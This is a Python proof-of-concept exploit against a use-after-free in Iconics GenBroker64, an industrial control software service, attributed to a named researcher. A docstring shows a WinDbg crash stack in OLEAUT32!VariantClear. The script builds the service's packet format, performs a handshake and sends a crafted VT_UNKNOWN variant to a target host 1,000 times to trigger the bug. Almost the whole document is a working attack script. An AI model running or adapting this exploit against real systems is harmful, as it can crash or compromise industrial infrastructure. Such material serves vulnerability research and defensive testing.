# Axel '0vercl0k' Souchet - December 18 2020
"""
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
OLEAUT32!VarWeekdayName+0x22468:
00007ffa`e620c7f8 488b01          mov     rax,qword ptr [rcx] ds:00000000`2e5a2fd0=????????????????

0:006> kp
 # Child-SP          RetAddr           Call Site
00 00000000`093bad20 00007ffa`e620cb31 OLEAUT32!VarWeekdayName+0x22468
01 00000000`093bad50 00000001`4000c20a OLEAUT32!VariantClear+0x21
02 00000000`093bad80 00007ffa`ccfa10ea GenBroker64+0xc20a
03 00000000`093badb0 00007ffa`ccfa2ca6 VCRUNTIME140_1+0x10ea
04 00000000`093bade0 00007ffa`ccfa3ae5 VCRUNTIME140_1!_NLG_Return2+0x1b56
05 00000000`093baf10 00007ffa`ccfa2258 VCRUNTIME140_1!_NLG_Return2+0x2995
06 00000000`093baf40 00007ffa`ccfa40e9 VCRUNTIME140_1!_NLG_Return2+0x1108
07 00000000`093bafe0 00007ffa`e6ce121f VCRUNTIME140_1!_CxxFrameHandler4+0xa9
08 00000000`093bb050 00007ffa`e6c5d9c2 ntdll!_chkstk+0x19f
09 00000000`093bb080 00007ffa`ccfa3d82 ntdll!RtlUnwindEx+0x522
0a 00000000`093bb790 00007ffa`ccfa1635 VCRUNTIME140_1!_NLG_Return2+0x2c32
0b 00000000`093bb880 00007ffa`ccfa19e6 VCRUNTIME140_1!_NLG_Return2+0x4e5
0c 00000000`093bb920 00007ffa`ccfa232b VCRUNTIME140_1!_NLG_Return2+0x896
0d 00000000`093bbaf0 00007ffa`ccfa40e9 VCRUNTIME140_1!_NLG_Return2+0x11db
0e 00000000`093bbb90 00007ffa`e6ce119f VCRUNTIME140_1!_CxxFrameHandler4+0xa9
0f 00000000`093bbc00 00007ffa`e6caa229 ntdll!_chkstk+0x11f
10 00000000`093bbc30 00007ffa`e6cdfe0e ntdll!RtlRaiseException+0x399
11 00000000`093bc340 00007ffa`e439a839 ntdll!KiUserExceptionDispatcher+0x2e
12 00000000`093bd080 00007ffa`ccfa2753 KERNELBASE!RaiseException+0x69
13 00000000`093bd160 00007ffa`e6ce05e6 VCRUNTIME140_1!_NLG_Return2+0x1603
14 00000000`093bd240 00007ffa`ccc1ab24 ntdll!RtlCaptureContext+0x566
15 00000000`093bf980 00000001`4001c574 mfc140u+0x27ab24
16 00000000`093bfa20 00000001`40023241 GenBroker64+0x1c574
17 00000000`093bfae0 00000001`40025fdc GenBroker64+0x23241
18 00000000`093bfb40 00000001`4008afee GenBroker64+0x25fdc
19 00000000`093bfb80 00000001`4008a499 GenBroker64+0x8afee
1a 00000000`093bfc80 00000001`400858bd GenBroker64+0x8a499
1b 00000000`093bfda0 00000001`400860a9 GenBroker64+0x858bd
1c 00000000`093bfe20 00007ffa`e5187bd4 GenBroker64+0x860a9
1d 00000000`093bff30 00007ffa`e6cace71 KERNEL32!BaseThreadInitThunk+0x14
1e 00000000`093bff60 00000000`00000000 ntdll!RtlUserThreadStart+0x21
"""
import socket
import ctypes
import struct
import argparse


def p8(b):
    return struct.pack("<B", b)


def p16(w):
    return struct.pack("<H", w)


def p32(u):
    return struct.pack("<I", u)


def p64(q):
    return struct.pack("<Q", q)


class Header_t(ctypes.BigEndianStructure):
    _fields_ = [
        ("Version", ctypes.c_uint16),
        ("Level", ctypes.c_uint16),
        ("SenderID", ctypes.c_uint32),
        ("Length", ctypes.c_uint32),
    ]


assert ctypes.sizeof(Header_t) == 0xC


class PayloadHeader_t(ctypes.LittleEndianStructure):
    _fields_ = [
        ("Field0", ctypes.c_uint32),
        ("Field1", ctypes.c_uint32),
        ("Type", ctypes.c_uint32),
    ]


assert ctypes.sizeof(PayloadHeader_t) == 0xC


def build_unicode_str(content):
    uni_content = content.encode("utf-16")[2:]
    return (
        p8(0xFF)
        + p16(0xFFFE)
        + p8(0xFF)
        + p16(0xFFFF)
        + p32(0xFFFFFFFF)
        + p64(len(content))
        + uni_content
    )


def build_packet(lvl, content):
    header = Header_t(Version=0xDEAD, Level=lvl, SenderID=1, Length=len(content))
    return bytes(header) + bytes(content)


def handshake(s):
    payload_header = PayloadHeader_t(Field0=0x1111, Field1=0x2222)
    payload_header.Type = 0xBB8
    p = build_unicode_str("hello")
    payload = bytes(payload_header) + p
    bb8 = build_packet(1, payload)

    payload_header.Type = 0xBBA
    p = build_unicode_str("doar-e.github.io")
    payload = bytes(payload_header) + p
    bba = build_packet(1, payload)

    payload_header.Type = 0xBBC
    p = p32(0xDEADBEEF)
    payload = bytes(payload_header) + p
    bbc = build_packet(1, payload)
    for pkt in (bb8, bba, bbc):
        s.send(pkt)
        r = s.recv(128)


def build_vtunknown(clsid):
    datas = clsid.split("-")
    assert len(datas) == 5
    p = b""
    VT_UNKNOWN = 13
    p += p16(VT_UNKNOWN)
    p += p32(int(datas[0], 16))
    p += p16(int(datas[1], 16))
    p += p16(int(datas[2], 16))
    p += bytes.fromhex(datas[3])
    p += bytes.fromhex(datas[4])
    return p


def main():
    parser = argparse.ArgumentParser(
        "Paracosme - Iconics GenBroker64 use-after-free PoC by Axel '0vercl0k' Souchet"
    )
    parser.add_argument("--target", type=str, required=True)
    parser.add_argument("--port", default=38080)
    args = parser.parse_args()
    p = b""
    p += p32(0x11111111)
    p += p32(0x22222222)
    p += p32(0x33333333)
    p += build_unicode_str("PoC")
    p += p32(1)
    p += build_unicode_str("doar-e ftw!")
    p += p16(0)
    p += build_vtunknown("00000303-0000-0000-C000-000000000046")
    hdr = PayloadHeader_t(Field0=0x1111, Field1=0x2222, Type=0x3F0)
    payload = bytes(hdr) + p
    _3f0 = build_packet(4, payload)
    for _ in range(1_000):
        s = socket.create_connection((args.target, args.port))
        handshake(s)
        s.send(_3f0)
        s.close()
    print("Done")


if __name__ == "__main__":
    main()
